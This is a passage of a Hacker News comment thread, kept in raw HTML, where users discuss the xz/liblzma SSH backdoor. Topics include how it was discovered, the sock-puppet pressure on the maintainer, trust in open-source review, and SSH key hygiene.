id="c-39880607" checked=""/><div class="controls bullet"><span class="by">Randalthorro</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39879953">parent</a><span>|</span><a href="#39880302">next</a><span>|</span><label class="collapse" for="c-39880607">[-]</label><label class="expand" for="c-39880607">[2 more]</label></div><br/><div class="children"><div class="content">Absolutely not. Getting a job at any critical infrastructure software dev company is easier than contributing to the Linux kernel.</div><br/><div id="39881378" class="c"><input type="checkbox" id="c-39881378" checked=""/><div class="controls bullet"><span class="by">OsrsNeedsf2P</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39880607">parent</a><span>|</span><a href="#39880302">next</a><span>|</span><label class="collapse" for="c-39881378">[-]</label><label class="expand" for="c-39881378">[1 more]</label></div><br/><div class="children"><div class="content">Can confirm. I may work at Meta, but I was nearly banned from contributing to an open source project because my commits kept introducing bugs.</div><br/></div></div></div></div><div id="39880302" class="c"><input type="checkbox" id="c-39880302" checked=""/><div class="controls bullet"><span class="by">yodsanklai</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39879953">parent</a><span>|</span><a href="#39880607">prev</a><span>|</span><a href="#39881545">next</a><span>|</span><label class="collapse" for="c-39880302">[-]</label><label class="expand" for="c-39880302">[1 more]</label></div><br/><div class="children"><div class="content">&gt; So, there are very high incentives for companies to vet their devs, have proper code reviews, etc.<p>I&#x27;m not sure about that. It takes a few leetcode interviews to get in major tech companies. As for the review process, it&#x27;s not always thorough (if it looks legit and the tests pass...). However, employees are identifiable and would take huge risk to be caught doing anything fishy.</div><br/></div></div><div id="39881545" class="c"><input type="checkbox" id="c-39881545" checked=""/><div class="controls bullet"><span class="by">ivlad</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39879953">parent</a><span>|</span><a href="#39880302">prev</a><span>|</span><a href="#39879853">next</a><span>|</span><label class="collapse" for="c-39881545">[-]</label><label class="expand" for="c-39881545">[1 more]</label></div><br/><div class="children"><div class="content">We witnessed Juniper generating their VPN keys with Dual EC DRGB, and then the generator constants subverted with Juniper claiming of now knowing how did it happen.<p>I don’t think it affected Juniper firewall business in any significant way.</div><br/></div></div></div></div><div id="39879853" class="c"><input type="checkbox" id="c-39879853" checked=""/><div class="controls bullet"><span class="by">cqqxo4zV46cp</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39879593">parent</a><span>|</span><a href="#39879953">prev</a><span>|</span><a href="#39879743">next</a><span>|</span><label class="collapse" for="c-39879853">[-]</label><label class="expand" for="c-39879853">[2 more]</label></div><br/><div class="children"><div class="content">It’s insane to consider the actual discovery of this to be anything other than a lightning strike. What’s more interesting here is that we can say with near certainty that there are other backdoors like this out there.</div><br/><div id="39880612" class="c"><input type="checkbox" id="c-39880612" checked=""/><div class="controls bullet"><span class="by">Randalthorro</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39879853">parent</a><span>|</span><a href="#39879743">next</a><span>|</span><label class="collapse" for="c-39880612">[-]</label><label class="expand" for="c-39880612">[1 more]</label></div><br/><div class="children"><div class="content">Time to start looking at similar cases for sure.</div><br/></div></div></div></div><div id="39879743" class="c"><input type="checkbox" id="c-39879743" checked=""/><div class="controls bullet"><span class="by">legobmw99</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39879593">parent</a><span>|</span><a href="#39879853">prev</a><span>|</span><a href="#39879543">next</a><span>|</span><label class="collapse" for="c-39879743">[-]</label><label class="expand" for="c-39879743">[2 more]</label></div><br/><div class="children"><div class="content">This seems completely unrelated to the grandparent comment’s mention of open source LLMs</div><br/></div></div></div></div></div></div><div id="39879543" class="c"><input type="checkbox" id="c-39879543" checked=""/><div class="controls bullet"><span class="by">pas</span><span>|</span><a href="#39879487">parent</a><span>|</span><a href="#39879546">prev</a><span>|</span><a href="#39881411">next</a><span>|</span><label class="collapse" for="c-39879543">[-]</label><label class="expand" for="c-39879543">[7 more]</label></div><br/><div class="children"><div class="content">... if we want security it needs trust anyway. it doesn&#x27;t matter if it&#x27;s amazing Code GPT or Chad NSA, the PR needs to be reviewed by someone we trust.<p>it&#x27;s the trust that&#x27;s the problem.<p>web of trust purists were right just ahead of the time.</div><br/><div id="39879911" class="c"><input type="checkbox" id="c-39879911" checked=""/><div class="controls bullet"><span class="by">bee_rider</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39879543">parent</a><span>|</span><a href="#39880195">next</a><span>|</span><label class="collapse" for="c-39879911">[-]</label><label class="expand" for="c-39879911">[3 more]</label></div><br/><div class="children"><div class="content">It would actually be sort of interesting if multiple adversarial intelligence agencies could review and sign commits. We might not trust any particular intelligence agency, but I bet the NSA and China would both be interested in not letting much through, if they knew the other guy was looking.</div><br/><div id="39880009" class="c"><input type="checkbox" id="c-39880009" checked=""/><div class="controls bullet"><span class="by">ecshafer</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39879911">parent</a><span>|</span><a href="#39880195">next</a><span>|</span><label class="collapse" for="c-39880009">[-]</label><label class="expand" for="c-39880009">[2 more]</label></div><br/><div class="children"><div class="content">That is an interesting solution. If China, US, Russia, EU, etc all sign off and say &quot;yep this is secure&quot; we should trust it. Since if they think they found an exploit, they might assume the other people found an exploit. This is a little bit like the idea of a fair cut for a cake. If you have two people that want the last slice of cake, you have one cut and the other choose the first slice, since the chooser will choose the biggest slice, so the slicer knowing they will get the smaller will make it as equal as possible. In this case the NSA makes the cut (the code), and Russia &#x2F; China chooses if its allowed in.</div><br/><div id="39881509" class="c"><input type="checkbox" id="c-39881509" checked=""/><div class="controls bullet"><span class="by">Muromec</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39880009">parent</a><span>|</span><a href="#39880195">next</a><span>|</span><label class="collapse" for="c-39881509">[-]</label><label class="expand" for="c-39881509">[1 more]</label></div><br/><div class="children"><div class="content">NSA makes the cut and China picks the public key to use.<p>In all seriousness, those people will quickly find some middle ground and will just share keys with each other</div><br/></div></div></div></div></div></div><div id="39880195" class="c"><input type="checkbox" id="c-39880195" checked=""/><div class="controls bullet"><span class="by">grepfru_it</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39879543">parent</a><span>|</span><a href="#39879911">prev</a><span>|</span><a href="#39880049">next</a><span>|</span><label class="collapse" for="c-39880195">[-]</label><label class="expand" for="c-39880195">[1 more]</label></div><br/><div class="children"><div class="content">this is why microsoft bought github and has been onboarding major open source projects. they will be the trusted 3rd party (whether we like it our not is a different story)</div><br/></div></div><div id="39880049" class="c"><input type="checkbox" id="c-39880049" checked=""/><div class="controls bullet"><span class="by">pvg</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39879543">parent</a><span>|</span><a href="#39880195">prev</a><span>|</span><a href="#39879873">next</a><span>|</span><label class="collapse" for="c-39880049">[-]</label><label class="expand" for="c-39880049">[1 more]</label></div><br/><div class="children"><div class="content"><i>Chad NSA</i><p>It&#x27;s called the ANS is Chad.</div><br/></div></div><div id="39879873" class="c"><input type="checkbox" id="c-39879873" checked=""/><div class="controls bullet"><span class="by">cqqxo4zV46cp</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39879543">parent</a><span>|</span><a href="#39880049">prev</a><span>|</span><a href="#39881411">next</a><span>|</span><label class="collapse" for="c-39879873">[-]</label><label class="expand" for="c-39879873">[1 more]</label></div><br/><div class="children"><div class="content">That just…doesn’t make any sense.<p>Everyone starts from zero and works their way up.</div><br/></div></div></div></div><div id="39881104" class="c"><input type="checkbox" id="c-39881104" checked=""/><div class="controls bullet"><span class="by">4death4</span><span>|</span><a href="#39879487">parent</a><span>|</span><a href="#39881411">prev</a><span>|</span><a href="#39880229">next</a><span>|</span><label class="collapse" for="c-39881104">[-]</label><label class="expand" for="c-39881104">[3 more]</label></div><br/><div class="children"><div class="content">Imagine a world where a single OSS maintainer can do the work of 100 of today’s engineers thanks to AI. In the world you describe, it seems likely that contributors would decrease as individual productivity increases.</div><br/><div id="39881843" class="c"><input type="checkbox" id="c-39881843" checked=""/><div class="controls bullet"><span class="by">sureglymop</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39881104">parent</a><span>|</span><a href="#39881493">next</a><span>|</span><label class="collapse" for="c-39881843">[-]</label><label class="expand" for="c-39881843">[1 more]</label></div><br/><div class="children"><div class="content">Wouldn&#x27;t everything produced by an AI explicitly have to be checked&#x2F;reviewed by a human? If not, then the attack vector just shifts to the AI model and that&#x27;s where the backdoor is placed. Sure, one may be 50 times more efficient at maintaining such packages but the problem of verifiably secure systems actually gets worse not better.</div><br/></div></div><div id="39881493" class="c"><input type="checkbox" id="c-39881493" checked=""/><div class="controls bullet"><span class="by">Muromec</span><span>|</span><a href="#39879487">root</a><span>|</span><a href="#39881104">parent</a><span>|</span><a href="#39881843">prev</a><span>|</span><a href="#39880229">next</a><span>|</span><label class="collapse" for="c-39881493">[-]</label><label class="expand" for="c-39881493">[1 more]</label></div><br/><div class="children"><div class="content">And be burned out 100x faster</div><br/></div></div></div></div><div id="39880229" class="c"><input type="checkbox" id="c-39880229" checked=""/><div class="controls bullet"><span class="by">jnwatson</span><span>|</span><a href="#39879487">parent</a><span>|</span><a href="#39881104">prev</a><span>|</span><a href="#39881143">next</a><span>|</span><label class="collapse" for="c-39880229">[-]</label><label class="expand" for="c-39880229">[1 more]</label></div><br/><div class="children"><div class="content">Presumably the state actors are looking for other state actor&#x27;s bugs, and would try to fix them, or least fix them to only work for them.<p>That&#x27;s quite a game of cat and mouse.</div><br/></div></div><div id="39881143" class="c"><input type="checkbox" id="c-39881143" checked=""/><div class="controls bullet"><span class="by">starspangled</span><span>|</span><a href="#39879487">parent</a><span>|</span><a href="#39880229">prev</a><span>|</span><a href="#39879090">next</a><span>|</span><label class="collapse" for="c-39881143">[-]</label><label class="expand" for="c-39881143">[1 more]</label></div><br/><div class="children"><div class="content">Why AI agents?</div><br/></div></div></div></div><div id="39879090" class="c"><input type="checkbox" id="c-39879090" checked=""/><div class="controls bullet"><span class="by">dolmen</span><span>|</span><a href="#39879487">prev</a><span>|</span><a href="#39877929">next</a><span>|</span><label class="collapse" for="c-39879090">[-]</label><label class="expand" for="c-39879090">[2 more]</label></div><br/><div class="children"><div class="content">git.tukaani.org runs sshd. If that sshd was upgraded with the xz backdoor, we cannot exclude that the host was compromised as it could be have been a obvious target for the backdoor author.</div><br/><div id="39882373" class="c"><input type="checkbox" id="c-39882373" checked=""/><div class="controls bullet"><span class="by">bostik</span><span>|</span><a href="#39879090">parent</a><span>|</span><a href="#39877929">next</a><span>|</span><label class="collapse" for="c-39882373">[-]</label><label class="expand" for="c-39882373">[1 more]</label></div><br/><div class="children"><div class="content">Rather unlikely. The bad actor never had access to git.tukaani.org, and the sshd version running on that host is:<p><pre><code>    SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u3
</code></pre>
That is, a stable Debian release. Definitely not one with liblzma5:5.6.x</div><br/></div></div></div></div><div id="39877929" class="c"><input type="checkbox" id="c-39877929" checked=""/><div class="controls bullet"><span class="by">wiktor-k</span><span>|</span><a href="#39879090">prev</a><span>|</span><a href="#39877763">next</a><span>|</span><label class="collapse" for="c-39877929">[-]</label><label class="expand" for="c-39877929">[8 more]</label></div><br/><div class="children"><div class="content">&gt; OpenSSH certs are weird in that they include the signer&#x27;s public key.<p>OpenSSH signatures in general contain signer&#x27;s public key, which I personally think it&#x27;s not weird but rather cool since it allows verifying the signature without out of the band key delivery (like in OpenPGP). The authentication of the public key is a separate subject but at least some basic checks can be done with an OpenSSH signature only.</div><br/><div id="39878919" class="c"><input type="checkbox" id="c-39878919" checked=""/><div class="controls bullet"><span class="by">1oooqooq</span><span>|</span><a href="#39877929">parent</a><span>|</span><a href="#39877763">next</a><span>|</span><label class="collapse" for="c-39878919">[-]</label><label class="expand" for="c-39878919">[7 more]</label></div><br/><div class="children"><div class="content">&gt; cool since it allows verifying the signature without out of the band key delivery<p>hope you do key selection sanitization instead of the default (nobody does). otherwise you&#x27;re accepting random keys you have laying around (like github) when logging to secret.example.com</div><br/><div id="39879583" class="c"><input type="checkbox" id="c-39879583" checked=""/><div class="controls bullet"><span class="by">dolmen</span><span>|</span><a href="#39877929">root</a><span>|</span><a href="#39878919">parent</a><span>|</span><a href="#39879461">next</a><span>|</span><label class="collapse" for="c-39879583">[-]</label><label class="expand" for="c-39879583">[5 more]</label></div><br/><div class="children"><div class="content">Using an SSH key used with GitHub for other purposes than GitHub is not a good practice (even if it&#x27;s common).<p><a href="https:&#x2F;&#x2F;github.com&#x2F;dolmen&#x2F;github-keygen">https:&#x2F;&#x2F;github.com&#x2F;dolmen&#x2F;github-keygen</a></div><br/><div id="39880207" class="c"><input type="checkbox" id="c-39880207" checked=""/><div class="controls bullet"><span class="by">dmonitor</span><span>|</span><a href="#39877929">root</a><span>|</span><a href="#39879583">parent</a><span>|</span><a href="#39879461">next</a><span>|</span><label class="collapse" for="c-39880207">[-]</label><label class="expand" for="c-39880207">[4 more]</label></div><br/><div class="children"><div class="content">I’m confused. I make a unique private key for each machine I use. How is using that machine-specific key on multiple hosts insecure?</div><br/><div id="39880479" class="c"><input type="checkbox" id="c-39880479" checked=""/><div class="controls bullet"><span class="by">dolmen</span><span>|</span><a href="#39877929">root</a><span>|</span><a href="#39880207">parent</a><span>|</span><a href="#39881940">next</a><span>|</span><label class="collapse" for="c-39880479">[-]</label><label class="expand" for="c-39880479">[1 more]</label></div><br/><div class="children"><div class="content">Your SSH public keys used on GitHub are very publicly exposed.<p>This information could be used by SSH servers you are connecting to. You might think you are connecting anonymously, while in fact your SSH client is sending your public key which could then be resolved to your GitHub account.</div><br/></div></div><div id="39881940" class="c"><input type="checkbox" id="c-39881940" checked=""/><div class="controls bullet"><span class="by">1oooqooq</span><span>|</span><a href="#39877929">root</a><span>|</span><a href="#39880207">parent</a><span>|</span><a href="#39880479">prev</a><span>|</span><a href="#39879461">next</a><span>|</span><label class="collapse" for="c-39881940">[-]</label><label class="expand" for="c-39881940">[2 more]</label></div><br/><div class="children"><div class="content">edit your .ssh&#x2F;config.<p>add one Host entry per domain.<p>on the end of the file add one catch all host rule with IdentityFile &#x2F;dev&#x2F;null<p>otherwise you&#x27;re sending default key names to all hosts.<p>...and you are not sending id_rsa.pub to every single place you add a key, like most guides suggests, right? right?</div><br/><div id="39882465" class="c"><input type="checkbox" id="c-39882465" checked=""/><div class="controls bullet"><span class="by">ykonstant</span><span>|</span><a href="#39877929">root</a><span>|</span><a href="#39881940">parent</a><span>|</span><a href="#39879461">next</a><span>|</span><label class="collapse" for="c-39882465">[-]</label><label class="expand" for="c-39882465">[1 more]</label></div><br/><div class="children"><div class="content">I would be interested in a comprehensive guide on &quot;doing it right&quot;, or a link to a guide that suggests the right thing.</div><br/></div></div></div></div></div></div></div></div><div id="39879461" class="c"><input type="checkbox" id="c-39879461" checked=""/><div class="controls bullet"><span class="by">slooonz</span><span>|</span><a href="#39877929">root</a><span>|</span><a href="#39878919">parent</a><span>|</span><a href="#39879583">prev</a><span>|</span><a href="#39877763">next</a><span>|</span><label class="collapse" for="c-39879461">[-]</label><label class="expand" for="c-39879461">[1 more]</label></div><br/><div class="children"><div class="content">What do you mean ?</div><br/></div></div></div></div></div></div><div id="39877763" class="c"><input type="checkbox" id="c-39877763" checked=""/><div class="controls bullet"><span class="by">emeraldd</span><span>|</span><a href="#39877929">prev</a><span>|</span><a href="#39880139">next</a><span>|</span><label class="collapse" for="c-39877763">[-]</label><label class="expand" for="c-39877763">[2 more]</label></div><br/><div class="children"><div class="content">If I&#x27;m reading this right, would there be any persistent evidence of the executed payload? I can&#x27;t think of a reason anything would have to go to disk in this situation, so a compromise could easily look like an Auth failure in the logs ....  maybe a difference in timings .. but that&#x27;s about it ...</div><br/><div id="39877783" class="c"><input type="checkbox" id="c-39877783" checked=""/><div class="controls bullet"><span class="by">junon</span><span>|</span><a href="#39877763">parent</a><span>|</span><a href="#39880139">next</a><span>|</span><label class="collapse" for="c-39877783">[-]</label><label class="expand" for="c-39877783">[1 more]</label></div><br/><div class="children"><div class="content">Unless the payload did something that produced evidence, or if the program using openssl that was affected was, for some reason, having all of its actions logged, then no, probably not.</div><br/></div></div></div></div><div id="39880139" class="c"><input type="checkbox" id="c-39880139" checked=""/><div class="controls bullet"><span class="by">cryptonector</span><span>|</span><a href="#39877763">prev</a><span>|</span><a href="#39877790">next</a><span>|</span><label class="collapse" for="c-39880139">[-]</label><label class="expand" for="c-39880139">[3 more]</label></div><br/><div class="children"><div class="content">I&#x27;m surprised the attackers used Ed448 instead of Ed25519.</div><br/><div id="39880661" class="c"><input type="checkbox" id="c-39880661" checked=""/><div class="controls bullet"><span class="by">supposemaybe</span><span>|</span><a href="#39880139">parent</a><span>|</span><a href="#39882303">next</a><span>|</span><label class="collapse" for="c-39880661">[-]</label><label class="expand" for="c-39880661">[1 more]</label></div><br/><div class="children"><div class="content">Maybe they know something we don’t about Ed25519? [Queue X-Files theme tune]</div><br/></div></div><div id="39882303" class="c"><input type="checkbox" id="c-39882303" checked=""/><div class="controls bullet"><span class="by">t0mas88</span><span>|</span><a href="#39880139">parent</a><span>|</span><a href="#39880661">prev</a><span>|</span><a href="#39877790">next</a><span>|</span><label class="collapse" for="c-39882303">[-]</label><label class="expand" for="c-39882303">[1 more]</label></div><br/><div class="children"><div class="content">Maybe their organisation has a policy that requires stronger encryption? Possibly because that organisation is also in the business of cracking such encryption...</div><br/></div></div></div></div><div id="39877790" class="c"><input type="checkbox" id="c-39877790" checked=""/><div class="controls bullet"><span class="by">noncoml</span><span>|</span><a href="#39880139">prev</a><span>|</span><a href="#39880945">next</a><span>|</span><label class="collapse" for="c-39877790">[-]</label><label class="expand" for="c-39877790">[21 more]</label></div><br/><div class="children"><div class="content">Unpopular opinion, but I cannot but admire the whole operation. Condemn it of course, but still admire it. It was a piece of art! From conception to execution, masterful! We got extremely lucky that it was caught so early.</div><br/><div id="39878611" class="c"><input type="checkbox" id="c-39878611" checked=""/><div class="controls bullet"><span class="by">Tuna-Fish</span><span>|</span><a href="#39877790">parent</a><span>|</span><a href="#39879393">next</a><span>|</span><label class="collapse" for="c-39878611">[-]</label><label class="expand" for="c-39878611">[4 more]</label></div><br/><div class="children"><div class="content">If the payload didn&#x27;t have a random .5 second hang during SSH login, it would probably not have been found for a long time.<p>The next time, the attackers probably manage to build a payload that doesn&#x27;t cause weird latency spikes on operations that people wait on.<p>(For some reason this brings to mind how Kim Dotcom figured out he was the target of an illegal wiretap... because he suddenly had a much higher ping in MW3. When he troubleshooted, he found out that all his packets specifically got routed a very long physical distance through a GCSB office. GCSB has no mandate to wiretap permanent NZ residents. He ended up getting a personal apology from the NZ Prime Minister.)</div><br/><div id="39879440" class="c"><input type="checkbox" id="c-39879440" checked=""/><div class="controls bullet"><span class="by">jijijijij</span><span>|</span><a href="#39877790">root</a><span>|</span><a href="#39878611">parent</a><span>|</span><a href="#39880012">next</a><span>|</span><label class="collapse" for="c-39879440">[-]</label><label class="expand" for="c-39879440">[1 more]</label></div><br/><div class="children"><div class="content">&gt; If the payload didn&#x27;t have a random .5 second hang during SSH login, it would probably not have been found for a long time.<p>Ironic, how an evil actor failed for a lack of premature optimization :D</div><br/></div></div><div id="39880012" class="c"><input type="checkbox" id="c-39880012" checked=""/><div class="controls bullet"><span class="by">BuildTheRobots</span><span>|</span><a href="#39877790">root</a><span>|</span><a href="#39878611">parent</a><span>|</span><a href="#39879440">prev</a><span>|</span><a href="#39879393">next</a><span>|</span><label class="collapse" for="c-39880012">[-]</label><label class="expand" for="c-39880012">[2 more]</label></div><br/><div class="children"><div class="content">I&#x27;m a little out of touch, but for over a decade I&#x27;d say half the boxes I touched either didn&#x27;t have enough entropy or were trying to do rDNS for (internal) ranges to servers that didn&#x27;t host it and is nearly always hand waved away by the team running it as NFN.<p>That is to say, a half-second pause during the ssh login is absolutely the _least_ suspicious place place for it to happen and I&#x27;m somewhat amazed anyone thought to go picking at it as quickly as they did.</div><br/><div id="39882263" class="c"><input type="checkbox" id="c-39882263" checked=""/><div class="controls bullet"><span class="by">dannyw</span><span>|</span><a href="#39877790">root</a><span>|</span><a href="#39880012">parent</a><span>|</span><a href="#39879393">next</a><span>|</span><label class="collapse" for="c-39882263">[-]</label><label class="expand" for="c-39882263">[1 more]</label></div><br/><div class="children"><div class="content">What led to continuous investigation wasn&#x27;t just the 500ms pause, but large spikes in CPU activity when sshd was invoked, even without a login attempt.</div><br/></div></div></div></div></div></div><div id="39879393" class="c"><input type="checkbox" id="c-39879393" checked=""/><div class="controls bullet"><span class="by">jijijijij</span><span>|</span><a href="#39877790">parent</a><span>|</span><a href="#39878611">prev</a><span>|</span><a href="#39877849">next</a><span>|</span><label class="collapse" for="c-39879393">[-]</label><label class="expand" for="c-39879393">[3 more]</label></div><br/><div class="children"><div class="content">&gt; <i>&quot;After all, He-Who-Must-Not-Be-Merged did great things - terrible, yes, but great.&quot;</i><p>I think the most ingenious part was picking the right project to infiltrate. Reading &quot;Hans&#x27;&quot; IFUNC pull request discussion is heart-wrenching in hindsight, but it really shows why this project was chosen.<p>I would love to know how many people where behind &quot;Jia&quot; and &quot;Hans&quot; analyzing and strategizing communication and code contributions. Some aspects, like those third tier personas faking pressure on mailing lists, seem a bit carelessly crafted, so I think it&#x27;s still possible this was done by a sophisticated small team or even single individual. I presume a state actor would have people pumping out and maintaining fake personas all day for these kind of operations. I mean, would have kinda sucked, if someone thought: &quot;Hm. It&#x27;s a bit odd how rudely these three users are pushing. Who are they anyway? Oh, look they are all created at the same time. Suspicious. Why would anyone fake accounts to push so hard for this specifically? I need to investigate&quot;. Compared to the overall effort invested, that&#x27;s careless, badly planned or underfunded.</div><br/><div id="39879615" class="c"><input type="checkbox" id="c-39879615" checked=""/><div class="controls bullet"><span class="by">bcrescimanno</span><span>|</span><a href="#39877790">root</a><span>|</span><a href="#39879393">parent</a><span>|</span><a href="#39880439">next</a><span>|</span><label class="collapse" for="c-39879615">[-]</label><label class="expand" for="c-39879615">[1 more]</label></div><br/><div class="children"><div class="content">&gt; Compared to the overall effort invested, that&#x27;s careless, badly planned or underfunded.<p>Not at all. It&#x27;s a pattern that&#x27;s very easy to spot while the eyes of the world are looking for it. When it was needed, it worked exactly as it needed to work. Had the backdoor not been discovered, no one would have noticed--just like no one did notice for the past couple of years.<p>Had anyone noticed at the time, it would have been very easy to just back off and try a different tactic a few months down the line. Once something worked, it would be quick to fade into forgotten history--unlikely to be noticed until, like now, the plan was already discovered.</div><br/></div></div><div id="39880439" class="c"><input type="checkbox" id="c-39880439" checked=""/><div class="controls bullet"><span class="by">hun3</span><span>|</span><a href="#39877790">root</a><span>|</span><a href="#39879393">parent</a><span>|</span><a href="#39879615">prev</a><span>|</span><a href="#39877849">next</a><span>|</span><label class="collapse" for="c-39880439">[-]</label><label class="expand" for="c-39880439">[1 more]</label></div><br/><div class="children"><div class="content">Carelessness could arguably a part of operation: testing&#x2F;probing how thoroughly the community scrutinizes communication from untrusted individuals.</div><br/></div></div></div></div><div id="39877849" class="c"><input type="checkbox" id="c-39877849" checked=""/><div class="controls bullet"><span class="by">dc-programmer</span><span>|</span><a href="#39877790">parent</a><span>|</span><a href="#39879393">prev</a><span>|</span><a href="#39879522">next</a><span>|</span><label class="collapse" for="c-39877849">[-]</label><label class="expand" for="c-39877849">[9 more]</label></div><br/><div class="children"><div class="content">I agree, but the social engineering parts do feel particularly cruel</div><br/><div id="39878024" class="c"><input type="checkbox" id="c-39878024" checked=""/><div class="controls bullet"><span class="by">nocoiner</span><span>|</span><a href="#39877790">root</a><span>|</span><a href="#39877849">parent</a><span>|</span><a href="#39879522">next</a><span>|</span><label class="collapse" for="c-39878024">[-]</label><label class="expand" for="c-39878024">[8 more]</label></div><br/><div class="children"><div class="content">I felt really bad for the original maintainer getting dog-piled by people who berated him for not doing his (unpaid) job and basically just bring shame and discredit to himself and the community. Definitely cruel.<p>Though… do we know that the maintainer at that point was the same individual as the one who started the project? Goes deep, man.</div><br/><div id="39879087" class="c"><input type="checkbox" id="c-39879087" checked=""/><div class="controls bullet"><span class="by">thinkingemote</span><span>|</span><a href="#39877790">root</a><span>|</span><a href="#39878024">parent</a><span>|</span><a href="#39878355">next</a><span>|</span><label class="collapse" for="c-39879087">[-]</label><label class="expand" for="c-39879087">[3 more]</label></div><br/><div class="children"><div class="content">Its possible the adversary was behind or at least encouraged the dog piling who berated him.  Probably a normal basic tactic from a funded evil team playbook.<p>Might be worth reviewing those who berated him to see if they resolve to real people, to see how deep this operation goes.</div><br/><div id="39879338" class="c"><input type="checkbox" id="c-39879338" checked=""/><div class="controls bullet"><span class="by">returningfory2</span><span>|</span><a href="#39877790">root</a><span>|</span><a href="#39879087">parent</a><span>|</span><a href="#39879309">next</a><span>|</span><label class="collapse" for="c-39879338">[-]</label><label class="expand" for="c-39879338">[1 more]</label></div><br/><div class="children"><div class="content">This has been investigated and the conclusion is IMO clear: the dogpilling accounts were part of the operation. See the parts about Jigar Kumar in this link: <a href="https:&#x2F;&#x2F;boehs.org&#x2F;node&#x2F;everything-i-know-about-the-xz-backdoor" rel="nofollow">https:&#x2F;&#x2F;boehs.org&#x2F;node&#x2F;everything-i-know-about-the-xz-backdo...</a></div><br/></div></div><div id="39879309" class="c"><input type="checkbox" id="c-39879309" checked=""/><div class="controls bullet"><span class="by">formerly_proven</span><span>|</span><a href="#39877790">root</a><span>|</span><a href="#39879087">parent</a><span>|</span><a href="#39879338">prev</a><span>|</span><a href="#39878355">next</a><span>|</span><label class="collapse" for="c-39879309">[-]</label><label class="expand" for="c-39879309">[1 more]</label></div><br/><div class="children"><div class="content">One of them who left only one comment does, the rest are sock puppets.</div><br/></div></div></div></div><div id="39878355" class="c"><input type="checkbox" id="c-39878355" checked=""/><div class="controls bullet"><span class="by">StefanBatory</span><span>|</span><a href="#39877790">root</a><span>|</span><a href="#39878024">parent</a><span>|</span><a href="#39879087">prev</a><span>|</span><a href="#39879522">next</a><span>|</span><label class="collapse" for="c-39878355">[-]</label><label class="expand" for="c-39878355">[4 more]</label></div><br/><div class="children"><div class="content">Even if it&#x27;s not his fault the maintainer at this point won&#x27;t be trusted at all. I feel for him, I think even finding a job at this moment for him would be impossible. Why would you hire someone that could be suspected for that?</div><br/><div id="39879330" class="c"><input type="checkbox" id="c-39879330" checked=""/><div class="controls bullet"><span class="by">plg94</span><span>|</span><a href="#39877790">root</a><span>|</span><a href="#39878355">parent</a><span>|</span><a href="#39878729">next</a><span>|</span><label class="collapse" for="c-39879330">[-]</label><label class="expand" for="c-39879330">[1 more]</label></div><br/><div class="children"><div class="content">No. From what I&#x27;ve read on the openwall and lkml mailing lists (so generally people who know a lot more about these things than I do), nobody accused Lasse Collins, the original maintainer, of being involved in this, at all, and there wasn&#x27;t any notion of him becoming untrustworthy.</div><br/></div></div><div id="39878729" class="c"><input type="checkbox" id="c-39878729" checked=""/><div class="controls bullet"><span class="by">polio</span><span>|</span><a href="#39877790">root</a><span>|</span><a href="#39878355">parent</a><span>|</span><a href="#39879330">prev</a><span>|</span><a href="#39879522">next</a><span>|</span><label class="collapse" for="c-39878729">[-]</label><label class="expand" for="c-39878729">[2 more]</label></div><br/><div class="children"><div class="content">This could&#x27;ve happened to anybody, frankly. The attacker was advanced and persistent. I cannot help but feel sympathetic for the original maintainer here.</div><br/><div id="39878842" class="c"><input type="checkbox" id="c-39878842" checked=""/><div class="controls bullet"><span class="by">consumer451</span><span>|</span><a href="#39877790">root</a><span>|</span><a href="#39878729">parent</a><span>|</span><a href="#39879522">next</a><span>|</span><label class="collapse" for="c-39878842">[-]</label><label class="expand" for="c-39878842">[1 more]</label></div><br/><div class="children"><div class="content">From TFA&#x27;s profile:<p><a href="https:&#x2F;&#x2F;bsky.app&#x2F;profile&#x2F;filippo.abyssdomain.expert&#x2F;post&#x2F;3kovq64a2g32g" rel="nofollow">https:&#x2F;&#x2F;bsky.app&#x2F;profile&#x2F;filippo.abyssdomain.expert&#x2F;post&#x2F;3ko...</a><p>This is a profound realization, isn&#x27;t it? How much more paranoid should&#x2F;will maintainers be going forward?</div><br/></div></div></div></div></div></div></div></div></div></div><div id="39879522" class="c"><input type="checkbox" id="c-39879522" checked=""/><div class="controls bullet"><span class="by">kstrauser</span><span>|</span><a href="#39877790">parent</a><span>|</span><a href="#39877849">prev</a><span>|</span><a href="#39879475">next</a><span>|</span><label class="collapse" for="c-39879522">[-]</label><label class="expand" for="c-39879522">[2 more]</label></div><br/><div class="children"><div class="content">I bet it’s not that unpopular. It’s a very impressive attack in many ways:<p>- It’s subtle.<p>- It was built to over several years.<p>- If the attacker hadn’t screwed up the with the weird performance hit that triggered investigation (my dramatic theory: the attacker was horrified at the infonuclear bomb they were detonating and deliberately messed up), we likely wouldn’t know about it.<p>You can detest the end result while appreciating the complexity of the attack.</div><br/></div></div><div id="39879475" class="c"><input type="checkbox" id="c-39879475" checked=""/><div class="controls bullet"><span class="by">empath-nirvana</span><span>|</span><a href="#39877790">parent</a><span>|</span><a href="#39879522">prev</a><span>|</span><a href="#39880217">next</a><span>|</span><label class="collapse" for="c-39879475">[-]</label><label class="expand" for="c-39879475">[1 more]</label></div><br/><div class="children"><div class="content">I don&#x27;t think &quot;admire&quot; is the right word, but it&#x27;s a pretty impressive operation.</div><br/></div></div></div></div><div id="39880945" class="c"><input type="checkbox" id="c-39880945" checked=""/><div class="controls bullet"><span class="by">tambourine_man</span><span>|</span><a href="#39877790">prev</a><span>|</span><a href="#39878762">next</a><span>|</span><label class="collapse" for="c-39880945">[-]</label><label class="expand" for="c-39880945">[5 more]</label></div><br/><div class="children"><div class="content">I’d like to know what we mortals – those that run Ubuntu LTS on VMs, for instance  — need to do, if anything.</div><br/><div id="39882350" class="c"><input type="checkbox" id="c-39882350" checked=""/><div class="controls bullet"><span 